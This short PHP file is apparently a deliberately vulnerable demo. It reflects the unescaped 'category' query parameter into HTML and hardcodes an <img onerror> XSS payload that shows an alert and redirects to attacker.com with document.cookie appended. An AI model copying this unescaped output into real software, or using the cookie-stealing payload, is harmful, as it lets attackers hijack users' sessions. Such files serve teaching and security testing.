<?php
// Reflect the user input directly into HTML, now with a more advanced payload.
if (isset($_GET['category'])) {
  $category = $_GET['category'];
  // VULNERABILITY
  // Malicious Payload: Injecting an <img> with an onerror event to execute JS when the image fails to load.
  // The payload also changes the background color and includes a JavaScript redirect.
  echo "
    <div class='alert alert-danger' style='color:red;'>
        <strong>You selected: </strong>$category
    </div>
    <img src='nonexistent_image.jpg' onerror='document.body.style.backgroundColor=\"black\"; alert(\"XSS Triggered!\"); window.location=\"http://attacker.com?cookie=\" + document.cookie;'>
    ";
}
?>
<?php
